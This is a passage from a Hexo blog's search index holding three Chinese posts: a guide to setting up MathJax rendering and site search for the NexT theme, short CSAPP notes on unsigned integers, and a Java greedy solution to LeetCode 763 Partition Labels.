source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure></p><p>其中_config.yml用来设置配置文件，source里面的_posts用来保存所写博文，详细的配置方法和hexo结构，可参考官网说明: <a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p><h2 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h2><p>主题选择因人而异，我自己采用next的主题，这是GitHub上star最多的一款主题，功能齐全，界面优雅，可扩展性高，且依然在维护更新，这是<a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">github链接</a>，此外 <a href="https://hexo.io/theme" target="_blank" rel="noopener">https://hexo.io/theme</a> 上也提供了许多主题，根据文档直接配置即可不再多言，本文下面主要记录些配置next时遇到的一些坑和解决策略</p><h2 id="3、添加公式渲染"><a href="#3、添加公式渲染" class="headerlink" title="3、添加公式渲染"></a>3、添加公式渲染</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>hexo原生的引擎是不支持LaTeX的数学公式的，这导致如果需要写一些用到公式的博文只能用图片代替，很不友好，一个比较好的解决方案是将原生的marked渲染引擎改为kramed渲染引擎，后者支持mathjax公式输出，mathjax是一款前端显示公式的插件，配置代码如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>安装完毕后，打开 /node_modules/hexo-renderer-kramed/lib/renderer.js，修改其中的代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Change inline math rule</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatText</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Fit kramed's rule: $$ + \1 + $$</span></span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="regexp">/`\$(.*?)\$`/g</span>, <span class="string">'$$$$$1$$$$'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 把上面这段改为下面</span></span><br><span class="line"><span class="comment">// Change inline math rule</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatText</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>然后，修改hexo的math包，改为mathjax:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-math --save</span><br><span class="line">npm install hexo-renderer-mathjax --save</span><br></pre></td></tr></table></figure></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>修改mathjax的配置文件: /node_modules/hexo-renderer-mathjax/mathjax.html，将最后的\<script\> 标签改为如下的格式<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></script\></p><h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>更改默认转义规则，这是由于markdown本身的语法会与LaTeX公式语法相冲突，打开 /node_modules\kramed\lib\rules\inline.js，修改escape，em两个转移规则如下:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">escape: /^\\([`*\[\]()# +\-.!_&gt;])/,</span><br><span class="line">em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br></pre></td></tr></table></figure></p><h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p>对于next主题，主题配置文件_config.yml中要设置(此点很重要，网上教程许多有遗漏，会导致无法渲染):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">math:</span><br><span class="line">    enable: true</span><br><span class="line">mathjax:</span><br><span class="line">    enable: true</span><br></pre></td></tr></table></figure></p><p>效果可以检查下，以下代码为显示薛定谔方程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$$ i\hbar\frac&#123;\partial \psi&#125;&#123;\partial t&#125;</span><br><span class="line">= \frac&#123;-\hbar^2&#125;&#123;2m&#125; \left(</span><br><span class="line">\frac&#123;\partial^2&#125;&#123;\partial x^2&#125;</span><br><span class="line">+ \frac&#123;\partial^2&#125;&#123;\partial y^2&#125;</span><br><span class="line">+ \frac&#123;\partial^2&#125;&#123;\partial z^2&#125;</span><br><span class="line">\right) \psi + V \psi.$$</span><br></pre></td></tr></table></figure></p><p>结果如下：</p><script type="math/tex; mode=display">i\hbar\frac{\partial \psi}{\partial t}= \frac{-\hbar^2}{2m} \left(\frac{\partial^2}{\partial x^2}+ \frac{\partial^2}{\partial y^2}+ \frac{\partial^2}{\partial z^2}\right) \psi + V \psi.</script><p>其实这个结果并不是重点，如何定位发现无法显示公式是引擎渲染问题，定位转义匹配问题，并且解决它们的过程才是重点，这也是程序员能力之所在</p><h2 id="4、添加本站搜索引擎"><a href="#4、添加本站搜索引擎" class="headerlink" title="4、添加本站搜索引擎"></a>4、添加本站搜索引擎</h2><p>这个网上有许多教程，不过对于next值得注意的是，searchdb包会导致产生的search.xml文件中的title包含类似CDATA这样的标签，理论上CDATA会被XML解析器忽略，但最后搜索时CDATA会莫名其妙地出现在搜索结果之中，所以建议采用search包，安装命令如下:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-generator-search</span><br></pre></td></tr></table></figure></p><p>完了直接修改站点配置文件_config.yml即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br></pre></td></tr></table></figure></p><p>当然搜索引擎还有一些细节，例如修改field可修改引擎覆盖范围等等，可参考对应文档</p>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP信息的表示与处理</title>
      <link href="/2019/09/20/csapp%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/"/>
      <url>/2019/09/20/csapp%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是对CMU 15213第一部分，信息的表示与处理的一个个人笔记和总结，主要包括计算机内整数的表示和浮点数的表示。</p><p>众所周知，计算机里对数字的表示方式是用二进制，显然，这与人类的习惯和直觉并不相符，根据Professor Bryant上课的说法，最早的计算机的确有人尝试过十进制，但后来发现，如果采用十进制表示数字，只能使用模拟信号处理，而模拟信号并不如数字信号准确和稳定，于是人们逐渐抛弃了其他进制的表示方法，而采用二进制。<br><a id="more"></a></p><p>值得一提的是，上个世纪70、80年代，苏联有科学家研究过三进制的计算机，半导体元器件有+1、0、-1三种形态，可以表示三进制，但是后来随着资金的撤出，三进制计算机流产。</p><h2 id="整数的表示"><a href="#整数的表示" class="headerlink" title="整数的表示"></a>整数的表示</h2><h3 id="无符号数（unsigned-number）"><a href="#无符号数（unsigned-number）" class="headerlink" title="无符号数（unsigned number）"></a>无符号数（unsigned number）</h3><p>通常的计算机中，用多位二进制码来表示一个整数（通常为32位或者64位），而其中如果最高位不用作符号位，则该表示方法为unsigned，c语言中就有unsigned int，unsigned char等等数据形式。</p><p>unsigned数的一般表示范围为: </p><p>$a+b=c$</p>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
            <tag> 符号数 </tag>
            
            <tag> 无符号数 </tag>
            
            <tag> 浮点数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode763 Partition Labels</title>
      <link href="/2019/09/20/LeetCode763-Partition-Labels/"/>
      <url>/2019/09/20/LeetCode763-Partition-Labels/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>A string S of lowercase letters is given. We want to partition this string into as many parts as possible so that each letter appears in at most one part, and return a list of integers representing the size of these parts.<br><a id="more"></a><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Input: S = &quot;ababcbacadefegdehijhklij&quot;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Output: [9,7,8]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Explanation:</span><br><span class="line">The partition is &quot;ababcbaca&quot;, &quot;defegde&quot;, &quot;hijhklij&quot;.</span><br><span class="line">This is a partition so that each letter appears in at most one part.</span><br><span class="line">A partition like &quot;ababcbacadefegde&quot;, &quot;hijhklij&quot; is incorrect, because it splits S into less parts.</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>根据题意，我们是要将一个字符串划分为若干个区间，任何单个的字符都只能出现在一个区间内，通过简单的模拟题意，很容易发现，这是一个可以利用贪心得以解决的问题。</p><p>先扫一遍字符串，求出每个字符开始位置和终止位置。在第二次扫描时，每次向后读取一个字符，更新最大终止位置，求出区间长度，当扫描的index到达当前最大终止位置，则说明这段区间所有的字符都出现且仅出现在该区间内，此时保存位置即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">partitionLabels</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] last = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S.length(); ++i)</span><br><span class="line">        last[S.charAt(i) - <span class="string">'a'</span>] = i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>, anchor = <span class="number">0</span>;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S.length(); ++i) &#123;</span><br><span class="line">        j = Math.max(j, last[S.charAt(i) - <span class="string">'a'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (i == j) &#123;</span><br><span class="line">            res.add(i - anchor + <span class="number">1</span>);</span><br><span class="line">            anchor = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ol><li>如果需要对英文或者数字字符进行hash，可以直接使用数组，不必从头再建立一个HashMap</li><li>本题曾出现在Amazon OA中</li></ol>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithms </tag>
            
            <tag> Greedy </tag>
            
            <tag> Amazon </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
